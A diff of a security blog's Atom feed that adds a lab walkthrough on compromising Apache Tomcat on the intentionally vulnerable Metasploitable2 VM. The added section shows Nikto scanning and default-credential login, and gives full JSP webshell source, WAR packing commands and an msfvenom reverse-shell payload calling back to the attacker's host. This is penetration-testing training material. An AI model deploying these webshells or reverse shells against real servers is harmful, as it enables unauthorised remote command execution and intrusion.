@@ -4,7 +4,7 @@
   <title><![CDATA[Category: metasploit | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/metasploit/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-06-27T14:52:27-05:00</updated>
+  <updated>2016-06-27T15:41:23-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -361,6 +361,75 @@ msf auxiliary(mysql_login) &gt; run
 <p>get the root:</p>
 
 <p><img src="/images/blog/misc/metasploitable2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<h3>Exploit Apache Tomcat (port 8180)</h3>
+
+<p>use Nikto  to scan</p>
+
+<p><code>nikto -h 182.168.79.179:8180</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>defalut credential is found: ID &lsquo;tomcat&rsquo;, PW &lsquo;tomcat&rsquo;.</p>
+
+<p>nagviate to <a href="http://192.168.79.179:8180/manager/html,">http://192.168.79.179:8180/manager/html,</a> input username/password, and we are in:</p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>same shit, generate upload WAR reverse shell backdoor.</p>
+
+<p>create webshell(from pentester lab, you may generate it using msfvenom)</p>
+
+<p>```php index.jsp
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+&lt;%@ page import=&ldquo;java.io.*&rdquo; %>
+&lt;%
+   String cmd = request.getParameter(&ldquo;cmd&rdquo;);
+   String output = &ldquo;&rdquo;;
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+&ldquo;</br>&rdquo;; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%></p>
+
+<pre><%=output %></pre>
+
+
+<pre><code>
+
+now pack the webshell
+</code></pre>
+
+<p>mkdir webshell
+cp index.jsp webshell</p>
+
+<p>cd webshell
+jar -cvf ../webshell.war *</p>
+
+<p>```</p>
+
+<p>deploy it and visit <a href="http://192.168.79.179:8180/webshell/index.jsp?">http://192.168.79.179:8180/webshell/index.jsp?</a></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use msfvenom to create webshell:</p>
+
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.79.173 lport=4444 -f war &gt; webshell1.war</code></p>
+
+<p>setup nc in kalo, deploy it and visit <a href="http://192.168.79.179:8180/webshell1/">http://192.168.79.179:8180/webshell1/</a></p>
+
+<p>After connection, get the shell:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p><img src="/images/blog/misc/metasploitable2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
